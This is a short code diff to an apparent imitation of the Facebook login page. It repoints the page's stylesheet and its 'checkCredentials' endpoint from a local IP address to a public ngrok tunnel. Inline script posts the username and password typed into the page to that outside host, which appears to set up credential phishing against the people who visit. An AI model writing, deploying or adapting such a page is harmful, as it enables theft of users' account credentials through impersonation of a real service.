@@ -6,7 +6,7 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Facebook Login Page</title>
-    <link rel="stylesheet" href="http://192.168.1.9:5000/css" />
+    <link rel="stylesheet" href="http://eshan.ngrok.io/css" />
   </head>
   <body>
     <div class="content">
@@ -39,7 +39,7 @@
               if(username == '' || password == ''){
                 alert("Enter username or password!");
               }else{
-                const url = 'http://192.168.1.9:5000/checkCredentials/';
+                const url = 'http://eshan.ngrok.io/checkCredentials/';
 
                 const data = {
                   username : username,
